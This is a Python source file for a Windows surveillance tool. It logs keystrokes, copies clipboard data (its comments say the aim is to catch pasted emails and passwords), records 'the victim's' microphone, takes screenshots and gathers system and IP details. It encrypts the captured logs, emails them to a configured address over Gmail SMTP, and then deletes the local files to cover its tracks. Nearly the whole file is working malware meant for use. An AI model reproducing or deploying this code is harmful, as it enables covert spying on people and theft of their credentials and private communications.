#Importing Liberaries
from GenerateKey import key

#for Sending Mails
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib


#For Capturing system Info.
import socket
import platform

#for Capturing Clipboard
import win32clipboard

#for Keylogging
from pynput.keyboard import Key,Listener


import time
import os

#To capture voice-mic of the device when it is on and The victim is speaking someone.
from scipy.io.wavfile import write
import sounddevice as sd

#to encrypt files using a password generated key
from cryptography.fernet import Fernet
import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC


import getpass
from requests import get


from multiprocessing import Process, freeze_support
from PIL import ImageGrab#for Capturing Screenshots Of the Device


keyinfo="key_logs.txt"
system_information="systeminfo.txt"
clipboard_information="clipboard.txt"
audio_information="audio.wav"
screenshot_info = "screenshot.png"


key_logs_e="e_key_logs.txt"
system_information_e="e_system_info.txt"
clipboard_information_e="e_clipboard.txt"



microphone_time=10
time_iteration=15
number_of_iterations_end=3

file_path=""#replace
extension="\\"
file_merge=file_path+extension

#YSender's and Reciever Info Goes Here.
email_address=""#replace
password=""#replace
toaddr=""#replace

#Send Email Function
def send_email(filename,attachment,toaddr):
    fromaddr=email_address
    msg=MIMEMultipart()#help us to create attachments images,videos,files
    msg['From']=fromaddr
    msg['To']=toaddr
    msg['Subject']="User-Logs:)"
    body="Body_of_the_mail"
    msg.attach(MIMEText(body,'plain'))#.attach method of multiinternet liberary
    filename=filename
    attachment=open(attachment,'rb')#read binary rb

    p=MIMEBase('application','octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)

    #instances to log into Senders gmail account

    #add header to the message
    p.add_header('Content-Disposition',"attachment; filename=%s" % filename)
    msg.attach(p)


    #Creating SMTP Session
    s=smtplib.SMTP('smtp.gmail.com',587)#smtp.SMTP(server,port)

    #create a TLS Session to secure the Connection
    s.starttls()

    #login into account
    s.login(fromaddr,password)#.smtplib.SMTP.login(gmailuser,password)

    #Convert Multipart Message Into A String
    text=msg.as_string()

    #send mail
    s.sendmail(fromaddr,toaddr,text)

    #close session
    s.quit()
send_email(keyinfo,file_path+extension+keyinfo,toaddr)


#Capturing System Info
def computer_info():
    with open(file_path+extension+system_information,"a") as f:
        hostname=socket.gethostname()
        IPAddr=socket.gethostbyname(hostname)
        try:
            public_ip=get("https://api.ipify.org"+'\n').text#we are making a get request to the site that is used to find ipand then converting into text.
            f.write("Public IP Address: "+ public_ip)
        except Exception:
            f.write("Coudn't Get Public IP Address(Reason: may be max query limit exceeded for ipify.org)"+'\n')
        f.write("Processor: "+(platform.processor())+'\n')
        f.write("System: "+platform.system()+ " "+ platform.version()+ '\n')
        f.write("Machine: "+platform.machine()+'\n')
        f.write("Hostname: "+ hostname+"\n")
        f.write("Private IP Address: "+ IPAddr+'\n')
computer_info()


#Capturing the Clipboard If Target Copies paste emails and passwords or other imp info.
def copy_clipboard():
    with open(file_path+extension+clipboard_information,"a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data=win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n"+pasted_data)
        except:
            f.write("Clipboard Could Not Be Copied.")
copy_clipboard()

#recording microphone of the victim device
def microphone():
    # set sampling frequency
    fs=44100
    #amt of seconds u want to record the microphone
    seconds=microphone_time

    myrecording=sd.rec(int(seconds * fs),samplerate=fs,channels=2)#.rec method of sound liberary
    sd.wait()
    write(file_path+extension+audio_information,fs,myrecording)
microphone()

#take screenshots of the Device
def screenshot():
    im=ImageGrab.grab()#.grab() method to capture the current screenshot of the device
    im.save(file_path+extension+screenshot_info)
screenshot()


#to Regulate the Features i.e screenshot,keylogger,voice recording after equal interval of time we use below Contol Variables
number_of_iterations=0
currentTime=time.time()
stoppingTime=currentTime+time_iteration


while number_of_iterations<number_of_iterations_end:

    count=0
    keys=[]

    def on_press(key):
        global keys,count,currentTime

        print(key)
        keys.append(key)
        count+=1
        currentTime=time.time()

        if count >=1:
            count=0
            write_file(keys)
            keys=[]

    def write_file(keys):
        with open(file_path + extension + keyinfo,"a") as f:
            for key in keys:
                k=str(key).replace("'","")
                if k.find("space")>0:
                    f.write('\n')
                    f.close()
                elif k.find("Key")==-1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime>stoppingTime:
            return False

    with Listener(on_press=on_press,on_release=on_release) as listener:
        listener.join()
    if currentTime>stoppingTime:
        with open(file_path+extension+keyinfo,"w") as f:
            f.write(" ")

        screenshot()
        send_email(screenshot_info,file_path+extension+screenshot_info,toaddr)

        copy_clipboard()
        number_of_iterations+=1

        currentTime=time.time()
        stoppingTime=time.time()+time_iteration



#Encrypting the Logs Obtained From Victim
def encrypt_logs():
    files_to_encrypt=[file_merge+system_information,file_merge+clipboard_information,file_merge+keyinfo]
    encrypted_file_names=[file_merge+system_information_e,file_merge+clipboard_information_e,file_merge+key_logs_e]

    count=0
    for encrypting_file in files_to_encrypt:
        with open(files_to_encrypt[count],'rb') as f:
            data=f.read()
        fernet=Fernet(key)
        encrypted=fernet.encrypt(data)


        with open(encrypted_file_names[count],'wb') as f:
            f.write(encrypted) #Write the Encrypted files to the output_file
        send_email(encrypted_file_names[count],encrypted_file_names[count],toaddr)
        count+=1

    time.sleep(120)


    #Cleaning Up Your Tracks:)
    delete_files=[system_information,clipboard_information,keyinfo,screenshot_info,audio_information]
    for file in delete_files:
        os.remove(file_merge+file)


encrypt_logs()












